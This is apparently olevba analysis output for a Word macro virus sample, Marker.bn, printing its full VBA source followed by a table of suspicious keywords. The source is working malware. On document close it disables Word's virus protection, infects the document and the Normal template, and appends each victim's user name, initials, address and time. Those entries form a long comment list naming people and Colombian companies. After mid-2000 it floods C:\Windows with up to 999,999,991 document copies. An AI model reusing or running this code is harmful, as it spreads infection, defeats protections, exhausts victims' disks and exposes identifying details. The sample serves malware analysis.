olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.bn-71bf07c4d8168f64a10b92afe90e2a0cbb87ba4b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.bn-71bf07c4d8168f64a10b92afe90e2a0cbb87ba4b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Andreas Marx
' AM
'
' 06.03.01 11:29:16
'
' Andreas Marx
' AM
'
' 06.03.01 11:28:27
'
' Avert
' A
'
' 12/14/99 12:40:30 PM
'
' Avert
' A
'
' 12/14/99 12:38:51 PM
'
' Avert
' A
'
' 12/14/99 12:38:32 PM
'
' Avert
' A
'
' 12/14/99 12:27:32 PM
'
' Avert
' A
'
' 12/14/99 12:21:32 PM
'
' JBERRA
' J
'
' 10/12/99 06:08:29 p.m.
'
' JBERRA
' J
'
' 10/12/99 04:12:25 p.m.
'
' JBERRA
' J
'
' 09/12/99 03:10:52 p.m.
'
' DLL
' DLL
'
' 09/12/1999 12:44:30
'
' DLL
' DLL
'
' 09/12/1999 12:38:49
'
' DLL
' DLL
'
' 09/12/1999 11:12:33
'
' DLL
' DLL
'
' 08/12/1999 11:32:35
'
' DLL
' DLL
'
' 07/12/1999 17:03:11
'
' DLL
' DLL
'
' 07/12/1999 15:12:21
'
' DLL
' DLL
'
' 07/12/1999 12:43:45
'
' DLL
' DLL
'
' 07/12/1999 11:53:00
'
' DLL
' DLL
'
' 06/12/1999 14:49:51
'
' DLL
' DLL
'
' 06/12/1999 13:47:50
'
' DLL
' DLL
'
' 06/12/1999 11:28:33
'
' Compaq
' C
'
' 03/12/99 07:21:39 p.m.
'
' Administracion Energetica
' AE
'
' 18/11/1999 08:57:05 a.m.
'
' Administracion Energetica
' AE
'
' 18/11/1999 08:19:46 a.m.
'
' Administracion Energetica
' AE
'
' 17/11/1999 03:39:06 p.m.
'
' Administracion Energetica
' AE
'
' 17/11/1999 02:59:00 p.m.
'
' Administracion Energetica
' AE
'
' 17/11/1999 12:35:25 p.m.
'
' Administracion Energetica
' AE
'
' 17/11/1999 08:57:22 a.m.
'
' Administracion Energetica
' AE
'
' 16/11/1999 02:23:25 p.m.
'
' Administracion Energetica
' AE
'
' 16/11/1999 11:59:17 a.m.
'
' Administracion Energetica
' AE
'
' 16/11/1999 10:53:54 a.m.
'
' Administracion Energetica
' AE
'
' 16/11/1999 10:42:58 a.m.
'
' Administracion Energetica
' AE
'
' 15/11/1999 06:20:38 p.m.
'
' Administracion Energetica
' AE
'
' 15/11/1999 06:12:53 p.m.
'
' Administracion Energetica
' AE
'
' 15/11/1999 05:29:40 p.m.
'
' Administracion Energetica
' AE
'
' 15/11/1999 04:54:03 p.m.
'
' Administracion Energetica
' AE
'
' 15/11/1999 04:34:31 p.m.
'
' Administracion Energetica
' AE
'
' 15/11/1999 02:22:50 p.m.
'
' Administracion Energetica
' AE
'
' 15/11/1999 12:23:43 p.m.
'
' Administracion Energetica
' AE
'
' 15/11/1999 10:11:44 a.m.
'
' Administracion Energetica
' AE
'
' 15/11/1999 08:04:10 a.m.
'
' Administracion Energetica
' AE
'
' 12/11/1999 05:42:22 p.m.
'
' Administracion Energetica
' AE
'
' 12/11/1999 05:39:37 p.m.
'
' Administracion Energetica
' AE
'
' 12/11/1999 04:52:37 p.m.
'
' Administracion Energetica
' AE
'
' 12/11/1999 02:52:26 p.m.
'
' Administracion Energetica
' AE
'
' 12/11/1999 01:42:43 p.m.
'
' Administracion Energetica
' AE
'
' 12/11/1999 01:01:36 p.m.
'
' Administracion Energetica
' AE
'
' 12/11/1999 11:40:33 a.m.
'
' Administracion Energetica
' AE
'
' 12/11/1999 10:02:24 a.m.
'
' Administracion Energetica
' AE
'
' 12/11/1999 07:55:13 a.m.
'
' Administracion Energetica
' AE
'
' 12/11/1999 07:45:09 a.m.
'
' Administracion Energetica
' AE
'
' 11/11/1999 03:31:23 p.m.
'
' Administracion Energetica
' AE
'
' 11/11/1999 01:56:17 p.m.
'
' Administracion Energetica
' AE
'
' 11/11/1999 10:15:08 a.m.
'
' Administracion Energetica
' AE
'
' 11/11/1999 09:53:56 a.m.
'
' Administracion Energetica
' AE
'
' 11/11/1999 08:24:55 a.m.
'
' Administracion Energetica
' AE
'
' 10/11/1999 04:05:32 p.m.
'
' Administracion Energetica
' AE
'
' 10/11/1999 03:59:28 p.m.
'
' Administracion Energetica
' AE
'
' 10/11/1999 03:40:18 p.m.
'
' Administracion Energetica
' AE
'
' 10/11/1999 03:24:27 p.m.
'
' Administracion Energetica
' AE
'
' 10/11/1999 12:22:09 p.m.
'
' Administracion Energetica
' AE
'
' 10/11/1999 09:34:38 a.m.
'
' Administracion Energetica
' AE
'
' 10/11/1999 07:48:43 a.m.
'
' Administracion Energetica
' AE
'
' 9/11/1999 11:50:32 a.m.
'
' Administracion Energetica
' AE
'
' 9/11/1999 09:29:51 a.m.
'
' Administracion Energetica
' AE
'
' 9/11/1999 09:12:27 a.m.
'
' Administracion Energetica
' AE
'
' 9/11/1999 09:03:06 a.m.
'
' Gerencia Financiera
' GF
'
' 9/11/1999 08:18:42 a.m.
'
' Gerencia Financiera
' GF
'
' 8/11/1999 05:39:19 p.m.
'
' Gerencia Financiera
' GF
'
' 8/11/1999 05:33:13 p.m.
'
' PATRICIA DE QUIROZ
' apagdeq
'
' 08/11/99 08:09:56 a.m.
'
' PATRICIA DE QUIROZ
' apagdeq
'
' 05/11/99 04:28:37 p.m.
'
' PATRICIA DE QUIROZ
' apagdeq
'
' 05/11/99 12:12:01 p.m.
'
' PATRICIA DE QUIROZ
' apagdeq
'
' 05/11/99 11:06:47 a.m.
'
' PATRICIA DE QUIROZ
' apagdeq
'
' 04/11/99 06:09:39 p.m.
'
' alberto barcina
' ab
'
' 5/11/99 0:58:27
'
' alberto barcina
' ab
'
' 4/11/99 23:04:48
'
' alberto barcina
' ab
'
' 3/11/99 18:26:32
'
' alberto barcina
' ab
'
' 29/10/99 1:43:03
'
' alberto barcina
' ab
'
' 28/10/99 11:19:32
'
' alberto barcina
' ab
'
' 26/10/99 19:33:39
'
' master user
' mu
'
' 26/10/99 15:44:49
'
' master user
' mu
'
' 26/10/99 15:00:38
'
' master user
' mu
'
' 26/10/99 08:41:59
'
' master user
' mu
'
' 26/10/99 08:40:42
'
' GAS NATURAL SA ESP
' GNSE
'
' 22/10/1999 12:52:52 PM
'
' GAS NATURAL SA ESP
' GNSE
'
' 21/10/1999 11:19:21 PM
'
' GAS NATURAL SA ESP
' GNSE
'
' 21/10/1999 11:14:48 PM
'
' GAS NATURAL SA ESP
' GNSE
'
' 21/10/1999 10:13:24 AM
'
' GAS NATURAL SA ESP
' GNSE
'
' 20/10/1999 04:46:09 PM
'
' GASORIENTE S.A ESP
' GAS
'
' 13/10/1999 06:37:20 PM
'
' GASORIENTE S.A ESP
' GAS
'
' 12/10/1999 12:28:11 PM
'
' GASORIENTE S.A ESP
' GAS
'
' 11/10/1999 07:17:39 PM
'
' GASORIENTE S.A ESP
' GAS
'
' 8/10/1999 12:30:45 PM
'
' GASORIENTE S.A ESP
' GAS
'
' 8/10/1999 09:56:10 AM
'
' GASORIENTE S.A ESP
' GAS
'
' 7/10/1999 07:43:52 PM
'
' GASORIENTE S.A ESP
' GAS
'
' 7/10/1999 07:16:26 PM
'
' GASORIENTE S.A ESP
' GAS
'
' 7/10/1999 10:14:15 AM
'
' GASORIENTE S.A ESP
' GAS
'
' 7/10/1999 10:13:31 AM
'
' GASORIENTE S.A ESP
' GAS
'
' 6/10/1999 08:53:22 PM
'
' GAS NATURAL
' GN
'
' 6/10/1999 09:59:22 AM
'
' GAS NATURAL
' GN
'
' 4/10/1999 12:02:04 PM
'
' GAS NATURAL
' GN
'
' 2/10/1999 11:16:33 AM
'
' GAS NATURAL
' GN
'
' 1/10/1999 02:55:58 PM
'
' GAS NATURAL
' GN
'
' 30/09/1999 05:47:14 PM
'
' GAS NATURAL
' GN
'
' 28/09/1999 12:33:20 PM
'
' GAS NATURAL
' GN
'
' 27/09/1999 04:16:04 PM
'
' GAS NATURAL
' GN
'
' 27/09/1999 10:01:11 AM
'
' Gas Natural S. A. ESP
' GNSAE
'
' 27/09/1999 09:47:57 AM
'
' Gas Natural S. A. ESP
' GNSAE
'
' 27/09/1999 08:14:07 AM
'
' GAS NATURAL S.A. ESP
' GNSE
'
' 24/09/1999 05:48:12 PM
'
' GAS NATURAL S.A. ESP
' GNSE
'
' 24/09/1999 12:33:23 PM
'
' GAS NATURAL S.A. ESP
' GNSE
'
' 24/09/1999 08:26:26 AM
'
' GAS NATURAL S.A. ESP
' GNSE
'
' 21/09/1999 03:00:13 PM
'
' GAS NATURAL S.A. ESP
' GNSE
'
' 17/09/1999 02:23:31 PM
'
' GAS NATURAL S.A. ESP
' GNSE
'
' 17/09/1999 08:44:12 AM
'
' GAS NATURAL S.A. ESP
' GNSE
'
' 16/09/1999 04:21:15 PM
'
' GAS NATURAL S.A. ESP
' GNSE
'
' 15/09/1999 05:07:11 PM
'
' GAS NATURAL S.A. ESP
' GNSE
'
' 15/09/1999 01:18:40 PM
'
' Gas Natural E.S.P.
' GNE
'
' 15/09/1999 11:54:09 AM
'
' Gas Natural E.S.P.
' GNE
'
' 15/09/1999 08:56:53 AM
'
' Gas Natural E.S.P.
' GNE
'
' 15/09/1999 07:49:03 AM
'
' Gas Natural E.S.P.
' GNE
'
' 14/09/1999 07:32:49 PM
'
' Gas Natural E.S.P.
' GNE
'
' 14/09/1999 09:06:58 AM
'
' Gas Natural E.S.P.
' GNE
'
' 14/09/1999 07:13:54 AM
'
' Gas Natural E.S.P.
' GNE
'
' 13/09/1999 03:46:53 PM
'
' Gas Natural E.S.P.
' GNE
'
' 13/09/1999 02:42:51 PM
'
' Gas Natural E.S.P.
' GNE
'
' 13/09/1999 01:12:36 PM
'
' Gas Natural E.S.P.
' GNE
'
' 13/09/1999 06:42:34 AM
'
' Gas Natural E.S.P.
' GNE
'
' 11/09/1999 12:49:32 PM
'
' Gas Natural E.S.P.
' GNE
'
' 10/09/1999 06:37:09 PM
'
' Gas Natural E.S.P.
' GNE
'
' 10/09/1999 03:57:12 PM
'
' Gas Natural E.S.P.
' GNE
'
' 10/09/1999 12:55:49 PM
'
' Gas Natural E.S.P.
' GNE
'
' 10/09/1999 12:36:26 PM
'
' Gas Natural E.S.P.
' GNE
'
' 10/09/1999 12:24:13 PM
'
' Gas Natural E.S.P.
' GNE
'
' 10/09/1999 08:06:32 AM
'
' Gas Natural E.S.P.
' GNE
'
' 9/09/1999 08:03:05 PM
'
' Gas Natural E.S.P.
' GNE
'
' 9/09/1999 07:45:41 PM
'
' Gas Natural E.S.P.
' GNE
'
' 9/09/1999 08:03:19 AM
'
' Gas Natural E.S.P.
' GNE
'
' 9/09/1999 06:43:38 AM
'
' Gas Natural E.S.P.
' GNE
'
' 8/09/1999 04:04:36 PM
'
' Gas Natural E.S.P.
' GNE
'
' 8/09/1999 07:55:24 AM
'
' Gas Natural E.S.P.
' GNE
'
' 8/09/1999 07:51:52 AM
'
' COMPAQ
' C
'
' 7/09/1999 11:38:58 AM
'
' COMPAQ
' C
'
' 6/09/1999 03:09:00 PM
'
' COMPAQ
' C
'
' 6/09/1999 11:27:49 AM
'
' COMPAQ
' C
'
' 3/09/1999 03:58:05 PM
'
' COMPAQ
' C
'
' 3/09/1999 03:48:39 PM
'
' COMPAQ
' C
'
' 3/09/1999 02:35:46 PM
'
' GAS NATURAL
' GN
'
' 3/09/1999 12:57:38 PM
'
' GAS NATURAL
' GN
'
' 3/09/1999 11:51:42 AM
'
' GAS NATURAL
' GN
'
' 3/09/1999 09:50:25 AM
'
' GAS NATURAL
' GN
'
' 3/09/1999 09:50:09 AM
'
' GAS NATURAL
' GN
'
' 3/09/1999 09:49:46 AM
'
Private Sub Document_Close()
  
  On Error Resume Next
  If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
      Const exi = "la macro de colombia"
      Dim DInfec, planinfec As Boolean
      Dim Docu, Plan As Object
      Dim modulin, contemodu, Ninfec As String
      Dim Nume As Integer
      Dim Copform As Object
   
      Set Docu = ActiveDocument.VBProject.VBComponents.Item(1)
      Set Plan = NormalTemplate.VBProject.VBComponents.Item(1)
      
      SaveDoc = ActiveDocument.Saved
      Saveplan = NormalTemplate.Saved
   
      DInfec = Docu.codemodule.Find(exi, 1, 1, 40000, 40000)
      Plainfec = Plan.codemodule.Find(exi, 1, 1, 40000, 40000)

      Ninfec = "'" & " " & Application.UserName & Chr(13) & "'" & " " & Application.UserInitials & Chr(13) & "'" & " " & Application.UserAddress & Chr(13) & "'" & " " & Now() & Chr(13) & "'" & " "
      
      Options.VirusProtection = False
   
      Nume = Mid(Int(Rnd() * 10), 1, 1)
      Nume = Nume
      nume1 = 7
      If Nume = nume1 Or Plainfec = False Then
         
         If DInfec = True And Plainfec = False Then
            Docu.codemodule.addfromstring Ninfec
            contemodu = Docu.codemodule.Lines(1, Docu.codemodule.CountOfLines)
            Plan.codemodule.addfromstring contemodu
         End If

         If DInfec = False And Plainfec = True Then
            Plan.codemodule.addfromstring Ninfec
            contemodu = Plan.codemodule.Lines(1, Plan.codemodule.CountOfLines)
            Docu.codemodule.addfromstring contemodu
         End If
         
         
      
         If SaveDoc = True Then ThisDocument.Save
         If SaveDoc = True Then NormalTemplate.Save
      End If
  End If
    sd = Day(Now()) & "-" & Month(Now()) & "-" & Year(Now())
  sd = Trim(sd)
  If Year(Now()) >= 2000 And Month(Now()) > 6 Then
    ChangeFileOpenDirectory "C:\Windows\"
    For i = 1 To 999999991
        ActiveDocument.SaveAs FileName:=("AA" & i & "AA.DOC"), FileFormat:= _
        wdFormatDocument, LockComments:=False, Password:="", AddToRecentFiles:= _
        True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
        False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
        SaveAsAOCELetter:=False
    Next
  End If

End Sub


































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

